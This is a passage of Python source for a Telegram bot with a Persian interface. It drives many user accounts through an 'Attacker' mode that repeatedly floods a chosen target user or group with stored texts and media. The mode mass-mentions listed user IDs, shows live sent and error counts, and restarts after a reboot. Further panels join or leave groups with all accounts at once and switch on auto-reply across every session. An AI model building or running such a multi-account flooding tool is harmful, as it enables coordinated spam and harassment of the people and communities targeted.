      online = [s for s in grp_sessions() if s in managed]
      if started_at and active:
          delta = datetime.utcnow() - started_at
          h, rem = divmod(int(delta.total_seconds()), 3600)
          m, s   = divmod(rem, 60)
          runtime = f"{h:02d}:{m:02d}:{s:02d}"
      else:
          runtime = "—"
      icon = pe('🟢') + " فعال" if active else pe('🔴') + " متوقف"
      last_upd = datetime.now(IRAN_TZ).strftime("%H:%M:%S")
      items_cnt = len(atk.get("items", []))
      txt_cnt   = sum(1 for i in atk.get("items", []) if i["type"] == "text")
      med_cnt   = items_cnt - txt_cnt
      return (
          f"{pe('⚔️')} پنل زنده Attacker\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('👥')} گروه: {group_name}\n"
          f"{pe('📊')} وضعیت: {icon}\n"
          f"{pe('🎯')} مقصد: {target}\n"
          f"{pe('📝')} متن: {txt_cnt}  |  {pe('🖼')} مدیا: {med_cnt}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('📤')} ارسال‌شده: {sent:,}\n"
          f"{pe('❌')} خطا: {errors:,}\n"
          f"{pe('⏱')} آپتایم: {runtime}\n"
          f"{pe('👤')} اکانت فعال: {len(online)}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('🔄')} آپدیت: {last_upd}"
      )

    async def _atk_stats_updater(chat_id: int, msg_id: int):
      """Edit the live stats message every 5 seconds while attacker is active."""
      while True:
          try:
              atk = groups_db.get(group_name, {}).get("attacker", {})
              if not atk.get("active"):
                    break
              try:
                    await bot.edit_message(chat_id, msg_id, _live_stats_text(), parse_mode="html")
              except Exception:
                    pass
          except asyncio.CancelledError:
              break
          except Exception as e:
              log.warning(f"[atk_updater:{group_name}] {e}")
          await asyncio.sleep(5)
      # final edit showing stopped state
      try:
          await bot.edit_message(chat_id, msg_id, _live_stats_text(), parse_mode="html")
      except Exception:
          pass

    # register loop fn for watchdog + auto-start on bot launch
    _grp_atk_loop_refs[group_name] = _atk_loop
    # auto-start if was active before restart
    _atk_init = groups_db.get(group_name, {}).get("attacker", {})
    if _atk_init.get("active") and _atk_init.get("target") and _atk_init.get("items"):
      _old = atk_tasks.get(group_name)
      if _old is None or _old.done():
          atk_tasks[group_name] = asyncio.create_task(_atk_loop())
          log.warning(f"[atk:{group_name}] auto-started attacker on bot launch")

    @bot.on(events.CallbackQuery(data=b"g_atk"))
    async def g_atk_cb(event):
      if not grp_guard(event):
          return await event.answer()
      await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_start"))
    async def gatk_start_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      if not atk.get("target"):
          return await event.answer(" اول مقصد رو تنظیم کن", alert=True)
      if not atk.get("items"):
          return await event.answer(" اول محتوا اضافه کن", alert=True)
      atk["active"] = True
      save_groups()
      old = atk_tasks.get(group_name)
      if old and not old.done():
          old.cancel()
      atk_tasks[group_name] = asyncio.create_task(_atk_loop())
      # ── live stats panel ──────────────────────────────────────
      old_upd = atk_updater_tasks.pop(group_name, None)
      if old_upd and not old_upd.done():
          old_upd.cancel()
      try:
          live_msg = await bot.send_message(event.chat_id, _live_stats_text(), parse_mode="html")
          atk_live_msgs[group_name] = {"chat_id": event.chat_id, "msg_id": live_msg.id}
          atk_updater_tasks[group_name] = asyncio.create_task(
              _atk_stats_updater(event.chat_id, live_msg.id)
          )
      except Exception as _le:
          log.warning(f"[atk_live:{group_name}] could not send live panel: {_le}")
      # ─────────────────────────────────────────────────────────
      await event.answer(" Attacker شروع شد!")
      await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())

    @bot.on(events.CallbackQuery(data=b"gatk_combo"))
    async def gatk_combo_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["combo_mode"] = not atk.get("combo_mode", False)
      save_groups()
      state = "✅ فعال" if atk["combo_mode"] else "❌ غیرفعال"
      await event.answer(f" حالت ترکیبی: {state}")
      await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())

    @bot.on(events.CallbackQuery(data=b"gatk_seqmode"))
    async def gatk_seqmode_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["seq_mode"] = not atk.get("seq_mode", False)
      save_groups()
      state = "✅ فعال" if atk["seq_mode"] else "❌ غیرفعال"
      await event.answer(f"🔁 Sequential: {state}")
      await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())

    @bot.on(events.CallbackQuery(data=b"gatk_seqinterval"))
    async def gatk_seqinterval_cb(event):
      if not grp_guard(event):
          return await event.answer()
      cur_iv = _atk_state().get("seq_interval", 1)
      group_pending[event.sender_id] = {"step": "atk_seqinterval", "group": group_name}
      await sp_edit(event,
                     f"⏱ فاصله Sequential فعلی: {cur_iv} ثانیه\n\nعدد جدید رو بنویس (حداقل ۰.۱):",
                     buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_autostop"))
    async def gatk_autostop_cb(event):
      if not grp_guard(event):
          return await event.answer()
      cur_ash = _atk_state().get("auto_stop_hours", 0)
      cur_txt = f"{cur_ash} ساعت" if cur_ash else "غیرفعال"
      group_pending[event.sender_id] = {"step": "atk_autostop", "group": group_name}
      await sp_edit(event,
                     f"⏰ خاموش خودکار فعلی: {cur_txt}\n\n"
                     f"تعداد ساعت رو بنویس (مثلاً ۲ یا ۱.۵).\n"
                     f"برای غیرفعال کردن عدد ۰ بنویس:",
                     buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
      await event.answer()

    # ── session selector for group attacker ──────────────────────────────────
    def _gatk_selsess_text_buttons():
      atk = _atk_state()
      sessions = grp_sessions()
      sel = atk.get("sel_sessions", None)
      rows = []
      for sess in sessions:
          is_sel = sel is None or sess in sel
          tick = "✅" if is_sel else "⬜️"
          rows.append([Button.inline(f"{tick} {sess[:28]}", f"gatk_sesstog_{sess}".encode())])
      sel_count = len(sel) if sel is not None else len(sessions)
      rows.append([
          Button.inline("✅ همه", b"gatk_sessall"),
          Button.inline("⬜️ هیچ‌کدام", b"gatk_sessnone"),
      ])
      rows.append([Button.inline("🔙 برگشت به اتکر", b"g_atk")])
      text = (
          f"👤 انتخاب اکانت‌های اتکر — گروه {group_name}\n"
          f"انتخاب‌شده: {sel_count} از {len(sessions)}\n"
          f"فقط اکانت‌های تیک‌دار در اتکر شرکت می‌کنن."
      )
      return text, rows

    @bot.on(events.CallbackQuery(data=b"gatk_selsess"))
    async def gatk_selsess_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      if not sessions:
          return await event.answer("⚠️ هیچ سشنی توی این گروه نیست", alert=True)
      text, rows = _gatk_selsess_text_buttons()
      await sp_edit(event, text, buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gatk_sesstog_(.+)"))
    async def gatk_sesstog_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess_name = event.pattern_match.group(1).decode()
      atk = _atk_state()
      sessions = grp_sessions()
      sel = atk.get("sel_sessions", None)
      if sel is None:
          sel = list(sessions)
      if sess_name in sel:
          sel.remove(sess_name)
      else:
          sel.append(sess_name)
      atk["sel_sessions"] = sel
      save_groups()
      text, rows = _gatk_selsess_text_buttons()
      await sp_edit(event, text, buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_sessall"))
    async def gatk_sessall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["sel_sessions"] = None
      save_groups()
      text, rows = _gatk_selsess_text_buttons()
      await sp_edit(event, text, buttons=rows)
      await event.answer("✅ همه سشن‌ها انتخاب شدند")

    @bot.on(events.CallbackQuery(data=b"gatk_sessnone"))
    async def gatk_sessnone_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["sel_sessions"] = []
      save_groups()
      text, rows = _gatk_selsess_text_buttons()
      await sp_edit(event, text, buttons=rows)
      await event.answer("⬜️ هیچ سشنی انتخاب نشد")

    # ─────────────────────────────────────────────────────────────────────────

    @bot.on(events.CallbackQuery(data=b"gatk_stop"))
    async def gatk_stop_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["active"] = False
      save_groups()
      t = atk_tasks.pop(group_name, None)
      if t and not t.done():
          t.cancel()
      # ── stop live stats updater ───────────────────────────────
      upd = atk_updater_tasks.pop(group_name, None)
      if upd and not upd.done():
          upd.cancel()
      live = atk_live_msgs.pop(group_name, None)
      if live:
          try:
              await bot.edit_message(live["chat_id"], live["msg_id"], _live_stats_text(), parse_mode="html")
          except Exception:
              pass
      # ─────────────────────────────────────────────────────────
      await event.answer(" Attacker متوقف شد")
      await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())

    @bot.on(events.CallbackQuery(data=b"gatk_settgt"))
    async def gatk_settgt_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "atk_target", "group": group_name}
      await sp_edit(event, " آیدی یا @username مقصد حمله رو بنویس:",
                     buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_delay"))
    async def gatk_delay_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "atk_delay", "group": group_name}
      await sp_edit(event, " تاخیر بین پیام‌ها رو به ثانیه بنویس (حداقل ۱):",
                     buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_addtext"))
    async def gatk_addtext_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "atk_text", "group": group_name}
      atk = _atk_state()
      cnt = sum(1 for i in atk.get("items", []) if i["type"] == "text")
      await sp_edit(event, f" متن بنویس (فعلاً {cnt} متن داریم).\nهر پیام یه آیتم، /done برای پایان:",
                     buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
      await event.answer()

    for _mtype in ("photo", "gif", "video"):
      _mtype_cap = _mtype
      _emoji = {"photo": "", "gif": "", "video": ""}[_mtype]
      @bot.on(events.CallbackQuery(data=f"gatk_add{_mtype}".encode()))
      async def gatk_add_media_cb(event, mtype=_mtype_cap, emoji=_emoji):
          if not grp_guard(event):
              return await event.answer()
          group_pending[event.sender_id] = {"step": f"atk_media_{mtype}", "group": group_name}
          atk = _atk_state()
          cnt = sum(1 for i in atk.get("items", []) if i["type"] == mtype)
          await sp_edit(event,
              f"{emoji} فایل {mtype} بفرست (فعلاً {cnt} فایل داریم).\n/done برای پایان:",
              buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
          await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_addsticker"))
    async def gatk_addsticker_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "atk_media_sticker", "group": group_name}
      atk = _atk_state()
      cnt = sum(1 for i in atk.get("items", []) if i["type"] == "sticker")
      await sp_edit(event,
          f" Sticker بفرست (فعلاً {cnt} استیکر داریم).\n/done برای پایان:",
          buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_selgrp"))
    async def gatk_selgrp_cb(event):
      if not grp_guard(event):
          return await event.answer()
      # فیلتر بر اساس سشن‌های انتخاب‌شده در اتکر
      atk_s    = _atk_state()
      _sel     = atk_s.get("sel_sessions", None)  # None = همه
      sessions = grp_sessions()
      if _sel is not None:
          sessions = [s for s in sessions if s in _sel]
      online = [s for s in sessions if s in managed]
      if not online:
          _msg = "⚠️ هیچ‌کدام از سشن‌های انتخاب‌شده آنلاین نیستن" if _sel else "⚠️ هیچ اکانتی آنلاین نیست"
          return await event.answer(_msg, alert=True)
      _sel_label = f"{len(online)} سشن انتخاب‌شده" if _sel is not None else f"{len(online)} اکانت"
      await event.answer("⏳ در حال دریافت گروه‌ها از سشن‌های انتخاب‌شده...")
      try:
          import time as _t
          _sel_sig   = ",".join(sorted(online))
          _cache_key = f"grp_{group_name}_{hash(_sel_sig)}"
          _cached = _atk_grp_cache.get(_cache_key)
          if _cached and (_t.time() - _cached["ts"]) < _ATK_GRP_CACHE_TTL:
              groups = _cached["groups"]
          else:
              groups = await _fetch_joined_groups(online)
              _atk_grp_cache[_cache_key] = {"groups": groups, "ts": _t.time()}
          if not groups:
              await sp_edit(event, "⚠️ هیچ گروهی پیدا نشد.\nاول با سشن‌های انتخاب‌شده جوین بشید.",
                             buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
              return
          _PAGE = 45
          _total = len(groups)
          _page = 0
          _slice = groups[_page * _PAGE: (_page + 1) * _PAGE]
          rows = []
          for name, gid in _slice:
              label = (name or str(gid))[:30]
              rows.append([Button.inline(f"🔘 {label}", f"gatk_setgrp_{gid}".encode())])
          nav = []
          if _total > _PAGE:
              nav.append(Button.inline(f"➡️ بعدی (صفحه ۲ از {(_total-1)//_PAGE+1})",
                                       f"gatk_selgrpg_1".encode()))
          if nav:
              rows.append(nav)
          rows.append([Button.inline("⚔️ Attacker", b"g_atk")])
          await sp_edit(event,
              f"👥 گروه‌های جوین‌شده — {_total} گروه از {_sel_label}\n"
              f"صفحه ۱ از {(_total-1)//_PAGE+1} | یکی رو انتخاب کن:",
              buttons=rows)
      except Exception as e:
          await sp_edit(event, f"❌ خطا: {e}",
                         buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])

    @bot.on(events.CallbackQuery(pattern=b"gatk_selgrpg_(.+)"))
    async def gatk_selgrpg_cb(event):
      if not grp_guard(event):
          return await event.answer()
      try:
          _page = int(event.pattern_match.group(1).decode())
      except Exception:
          _page = 0
      # cache key متناسب با انتخاب فعلی
      _atk_pg  = _atk_state()
      _sel_pg  = _atk_pg.get("sel_sessions", None)
      _sess_pg = grp_sessions()
      if _sel_pg is not None:
          _sess_pg = [s for s in _sess_pg if s in _sel_pg]
      _online_pg = [s for s in _sess_pg if s in managed]
      _cache_key = f"grp_{group_name}_{hash(','.join(sorted(_online_pg)))}"
      cached = _atk_grp_cache.get(_cache_key)
      if not cached:
          return await event.answer("⚠️ کش منقضی شده. دوباره From Joined Groups بزن.", alert=True)
      groups = cached["groups"]
      _PAGE = 45
      _total = len(groups)
      _max_page = (_total - 1) // _PAGE
      _page = max(0, min(_page, _max_page))
      _slice = groups[_page * _PAGE: (_page + 1) * _PAGE]
      rows = []
      for name, gid in _slice:
          label = (name or str(gid))[:30]
          rows.append([Button.inline(f"🔘 {label}", f"gatk_setgrp_{gid}".encode())])
      nav = []
      if _page > 0:
          nav.append(Button.inline("⬅️ قبلی", f"gatk_selgrpg_{_page-1}".encode()))
      if _page < _max_page:
          nav.append(Button.inline("➡️ بعدی", f"gatk_selgrpg_{_page+1}".encode()))
      if nav:
          rows.append(nav)
      rows.append([Button.inline("⚔️ Attacker", b"g_atk")])
      await sp_edit(event,
          f"👥 گروه‌های جوین‌شده — {_total} گروه\n"
          f"صفحه {_page+1} از {_max_page+1} | یکی رو انتخاب کن:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gatk_setgrp_(.+)"))
    async def gatk_setgrp_cb(event):
      if not grp_guard(event):
          return await event.answer()
      gid_raw = event.pattern_match.group(1).decode()
      try:
          gid = int(gid_raw)
          online = [s for s in grp_sessions() if s in managed]
          grp_title = gid_raw
          if online:
              try:
                    meta = managed.get(online[0])
                    if meta:
                        entity = await meta["client"].get_entity(gid)
                        grp_title = getattr(entity, "title", gid_raw)
              except Exception:
                    pass
          atk = _atk_state()
          atk["target"] = str(gid)
          save_groups()
          await event.answer(f" مقصد: {grp_title}")
          await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())
      except Exception as e:
          await event.answer(f" خطا: {e}", alert=True)

    @bot.on(events.CallbackQuery(data=b"gatk_clr"))
    async def gatk_clr_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["items"] = []
      save_groups()
      await event.answer(" همه محتوا پاک شد")
      await sp_edit(event, _atk_panel_text(), buttons=_atk_buttons())

    # ── join / leave panel ────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_joinleave"))
    async def g_joinleave_cb(event):
      if not grp_guard(event):
          return await event.answer()
      await sp_edit(event,
          " جوین یا لفت گروه/کانال\nیه گزینه انتخاب کن:",
          buttons=[
              [Button.inline("📌 Join All Accounts", b"gjoin_all"),
                 Button.inline("📌 Leave All Accounts", b"gleave_all")],
              [Button.inline("👤 Join One Account", b"gjoin_one"),
                 Button.inline("👤 Leave One Account", b"gleave_one")],
              [Button.inline("🔙 Back", b"g_home")],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gjoin_all"))
    async def g_joinall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "gjoin_all", "group": group_name}
      await sp_edit(event, " لینک یا @username گروه/کانال برای جوین همه:",
                     buttons=[[Button.inline("❌ Cancel", b"g_joinleave")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gleave_all"))
    async def g_leaveall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "gleave_all", "group": group_name}
      await sp_edit(event, " لینک یا @username گروه/کانال برای لفت همه:",
                     buttons=[[Button.inline("❌ Cancel", b"g_joinleave")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gjoin_one"))
    async def g_joinone_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "gjoin_one", "group": group_name}
      await sp_edit(event, " لینک یا @username گروه/کانال برای جوین (بعدش اکانت انتخاب می‌کنی):",
                     buttons=[[Button.inline("❌ Cancel", b"g_joinleave")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gleave_one"))
    async def g_leaveone_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "gleave_one", "group": group_name}
      await sp_edit(event, " لینک یا @username گروه/کانال برای لفت (بعدش اکانت انتخاب می‌کنی):",
                     buttons=[[Button.inline("❌ Cancel", b"g_joinleave")]])
      await event.answer()

    # account picker for single join/leave (callback pattern: gjlpick_<action>_<sess>)
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gjlpick_(join|leave)_(.+)")))
    async def g_jl_pick(event):
      if not grp_guard(event):
          return await event.answer()
      action = event.pattern_match.group(1).decode()
      sess = event.pattern_match.group(2).decode()
      uid2 = event.sender_id
      pend2 = group_pending.pop(uid2, {})
      target_link = pend2.get("target", "")
      if not target_link:
          return await event.answer(" تارگت نامعلومه")
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" اکانت آفلاینه")
      try:
          if action == "join":
              from telethon.tl.functions.channels import JoinChannelRequest
              from telethon.tl.functions.messages import ImportChatInviteRequest
              from telethon.errors import UserAlreadyParticipantError, InviteRequestSentError
              link = target_link.strip().replace("https://", "").replace("http://", "")
              try:
                    if "joinchat/" in link:
                        invite_hash = link.split("joinchat/")[-1].lstrip("/").split("?")[0]
                        await meta["client"](ImportChatInviteRequest(invite_hash))
                    elif link.startswith("t.me/+"):
                        await meta["client"](ImportChatInviteRequest(link[6:]))
                    elif link.startswith("+") and not link[1:].lstrip("+").isdigit():
                        await meta["client"](ImportChatInviteRequest(link.lstrip("+")))
                    else:
                        if "t.me/" in link:
                            link = "@" + link.split("t.me/")[-1].split("?")[0]
                        try:
                            entity = await meta["client"].get_entity(link)
                            await meta["client"](JoinChannelRequest(entity))
                        except (UserAlreadyParticipantError, InviteRequestSentError):
                            pass
                        except Exception:
                            await meta["client"](JoinChannelRequest(link))
              except (UserAlreadyParticipantError, InviteRequestSentError):
                    pass
              label = "جوین شد"
          else:
              from telethon.tl.functions.channels import LeaveChannelRequest
              from telethon.tl.functions.messages import DeleteChatUserRequest
              from telethon.tl.types import Chat as _TLChat
              link = target_link.strip().replace("https://", "").replace("http://", "")
              if "t.me/" in link:
                    link = "@" + link.split("t.me/")[-1].split("?")[0]
              try:
                    entity = await meta["client"].get_entity(link)
                    if isinstance(entity, _TLChat):
                        _me = await meta["client"].get_me()
                        await meta["client"](DeleteChatUserRequest(chat_id=entity.id, user_id=_me.id))
                    else:
                        await meta["client"](LeaveChannelRequest(entity))
              except Exception:
                    await meta["client"](LeaveChannelRequest(link))
              label = "لفت شد"
          await event.answer(f" {sess} {label}!")
          await sp_edit(event, f" {sess} {label} از {target_link}",
                         buttons=[[Button.inline("🔙 Back", b"g_joinleave"),
                                   Button.inline("📋 Menu", b"g_home")]])
      except Exception as e:
          await event.answer(" خطا")
          err_hint = ""
          if "not part of" in str(e):
              err_hint = "\n برای عضو شدن، لینک دعوت (joinchat) بفرست نه آیدی."
          elif "INVITE_HASH" in str(e):
              err_hint = "\n هش لینک دعوت نادرست یا منقضی شده."
          await sp_edit(event, f" خطا برای {sess}:\n{e}{err_hint}",
                         buttons=[[Button.inline("🔙 Back", b"g_joinleave")]])

    # ── منشن لیست ────────────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_ids"))
    async def g_ids_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      atk = _atk_state()
      tag_cnt = len(atk.get("mention_ids", []))
      rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"gids_{s}".encode())]
              for s in sessions]
      rows.append([Button.inline(f"📌 All Accounts — Attacker Tag ({tag_cnt})", b"gatk_tags")])
      rows.append([Button.inline("🔙 Back", b"g_home")])
      await sp_edit(event,
          " منشن لیست\n"
          "━━━━━━━━━━━━━━\n"
          "آیدی‌های عددی که زیر پیام‌ها منشن می‌شن رو اینجا ست کن.\n"
          " کل اکانت‌ها = زیر پیام‌های Attacker تگ می‌شن\n"
          "اکانت رو انتخاب کن:",
          buttons=rows)
      await event.answer()

    # ── Attacker Tag List callbacks ───────────────────────────
    def _atk_tags_text():
      atk = _atk_state()
      ids = atk.get("mention_ids", [])
      lines = "\n".join(f"• {x}" for x in ids) if ids else "— خالی —"
      return (
          f" منشن تگ Attacker — {group_name}\n"
          f"━━━━━━━━━━━━━━\n"
          f"این آیدی‌ها با {groups_db.get(group_name, {}).get('atk_char', '𒀽')} زیر هر پیام Attacker منشن می‌شن:\n\n"
          f"{lines}\n"
          f"━━━━━━━━━━━━━━\n"
          f" فرمت: آیدی عددی یا @username"
      )

    def _atk_tags_buttons():
      return [
          [Button.inline("➕ Add ID / Username", b"gatk_tag_add"),
             Button.inline("🗑 Remove", b"gatk_tag_del")],
          [Button.inline("📌 Clear All", b"gatk_tag_clr")],
          [Button.inline("⚔️ Attacker", b"g_atk"),
             Button.inline("🔘 Mentions", b"g_ids")],
      ]

    @bot.on(events.CallbackQuery(data=b"gatk_tags"))
    async def gatk_tags_cb(event):
      if not grp_guard(event):
          return await event.answer()
      await sp_edit(event, _atk_tags_text(), buttons=_atk_tags_buttons())
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_tag_add"))
    async def gatk_tag_add_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "atk_tag_add", "group": group_name}
      await sp_edit(event,
          " آیدی عددی یا @username رو بنویس:\n"
          "(هر پیام یه آیدی — چندتا رو پشت سر هم بفرست، /done برای پایان)",
          buttons=[[Button.inline("❌ Cancel", b"gatk_tags")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_tag_del"))
    async def gatk_tag_del_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "atk_tag_del", "group": group_name}
      await sp_edit(event,
          " آیدی یا @username که می‌خوای حذف کنی بنویس:",
          buttons=[[Button.inline("❌ Cancel", b"gatk_tags")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gatk_tag_clr"))
    async def gatk_tag_clr_cb(event):
      if not grp_guard(event):
          return await event.answer()
      atk = _atk_state()
      atk["mention_ids"] = []
      save_groups()
      await event.answer(" لیست تگ پاک شد")
      await sp_edit(event, _atk_tags_text(), buttons=_atk_tags_buttons())

    @bot.on(events.CallbackQuery(pattern=b"gids_(.+)"))
    async def g_ids_session(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      ids = list(meta["state"].get("locked_users", set())) if meta else []
      txt = (
          f" منشن لیست — {sess}\n"
          f"━━━━━━━━━━━━━━\n"
          f"این آیدی‌ها زیر پیام‌ها تگ می‌شن:\n" +
          ("\n".join(f"• {x}" for x in ids) if ids else "— خالی —")
      )
      buttons = [
          [Button.inline("➕ Add ID", f"gidadd_{sess}".encode()),
             Button.inline("🗑 Remove ID", f"giddel_{sess}".encode())],
          [Button.inline("📌 Clear All", f"gidclear_{sess}".encode()),
             Button.inline("🔙 Back", b"g_ids")],
      ]
      await sp_edit(event, txt, buttons=buttons)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gidadd_(.+)"))
    async def g_idadd_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      group_pending[event.sender_id] = {"step": "idadd", "sess": sess, "group": group_name}
      await sp_edit(event, f" آیدی عددی برای {sess}:",
                     buttons=[[Button.inline("❌ Cancel", f"gids_{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"giddel_(.+)"))
    async def g_iddel_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      group_pending[event.sender_id] = {"step": "iddel", "sess": sess, "group": group_name}
      await sp_edit(event, f" آیدی که می‌خوای حذف کنی از {sess}:",
                     buttons=[[Button.inline("❌ Cancel", f"gids_{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gidclear_(.+)"))
    async def g_idclear(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if meta:
          meta["state"]["locked_users"] = set()
          save_session_state(sess, meta["state"])
      await event.answer(f" آیدی‌های {sess} پاک شد")
      await sp_edit(event, f" آیدی‌های {sess} پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", b"g_ids")]])

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: SELF (AUTO-REPLY) PANEL
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(data=b"g_enemy"))
    async def g_enemy_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      rows = []
      for s in sessions:
          meta = managed.get(s)
          ar = "✅" if (meta and meta["state"].get("auto_reply")) else "❌"
          rows.append([Button.inline(f"🔘 {ar} {s}", f"gen_{s}".encode())])
      rows.append([Button.inline("📌 Enable All", b"gself_all_on"),
                     Button.inline("📌 Disable All", b"gself_all_off")])
      rows.append([Button.inline("⚙️ Bulk Settings", b"g_self_bulk")])
      rows.append([Button.inline("🔙 Back", b"g_home")])
      await sp_edit(event, " پنل Self (اتو-ریپلای):\n(=فعال  =غیرفعال)\nروی هر سشن بزن برای تنظیمات", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gself_all_on"))
    async def gself_all_on_cb(event):
      if not grp_guard(event):
          return await event.answer()
      cnt = 0
      for s in grp_sessions():
          meta = managed.get(s)
          if meta:
              meta["state"]["auto_reply"] = True
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" Self برای {cnt} سشن روشن شد")
      await sp_edit(event, f" Self برای {cnt} سشن فعال شد.",
                     buttons=[[Button.inline("🔙 Back", b"g_enemy")]])

    @bot.on(events.CallbackQuery(data=b"gself_all_off"))
    async def gself_all_off_cb(event):
      if not grp_guard(event):
          return await event.answer()
      cnt = 0
      for s in grp_sessions():
          meta = managed.get(s)
          if meta:
              meta["state"]["auto_reply"] = False
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" Self برای {cnt} سشن خاموش شد")
      await sp_edit(event, f" Self برای {cnt} سشن غیرفعال شد.",
                     buttons=[[Button.inline("🔙 Back", b"g_enemy")]])

    # ═══════════════════════════════════════════════════════════
    # BULK SELF SETTINGS
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(data=b"g_self_bulk"))
    async def g_self_bulk_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      cnt = len(sessions)
      sample_meta = next((managed.get(s) for s in sessions if managed.get(s)), None)
      fmode = sample_meta["state"].get("self_reply_filter", "all") if sample_meta else "all"
      from telethon.tl.custom import Button as _Btn
      _FL = {"all": " همه", "text": " متن", "photo": " Photo",
               "gif": " GIF", "video": " Video", "sticker": " استیکر"}
      txt = (
          f" Bulk Settings Self — {group_name}\n"
          f"━━━━━━━━━━━━━━\n"
          f" {cnt} سشن تحت تأثیر\n"
          f"مد فعلی (اولین سشن): {_FL.get(fmode, fmode)}\n\n"
          f"هر تنظیمی اینجا روی همه سشن‌ها اعمال میشه:"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("📌 Toggle All Filters", b"g_bulk_fmode")],
          [Button.inline("📌 Set Text for All", b"g_bulk_settext")],
          [Button.inline("📌 Clear All Texts", b"g_bulk_clrtext"),
             Button.inline("📌 Clear All Content", b"g_bulk_clrall")],
          [Button.inline("🔙 Back", b"g_enemy")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"g_bulk_fmode"))
    async def g_bulk_fmode_cb(event):
      if not grp_guard(event):
          return await event.answer()
      _FC = ["all", "text", "photo", "gif", "video", "sticker"]
      _FL = {"all": " همه", "text": " متن", "photo": " Photo",
               "gif": " GIF", "video": " Video", "sticker": " استیکر"}
      sessions = grp_sessions()
      sample_meta = next((managed.get(s) for s in sessions if managed.get(s)), None)
      cur = sample_meta["state"].get("self_reply_filter", "all") if sample_meta else "all"
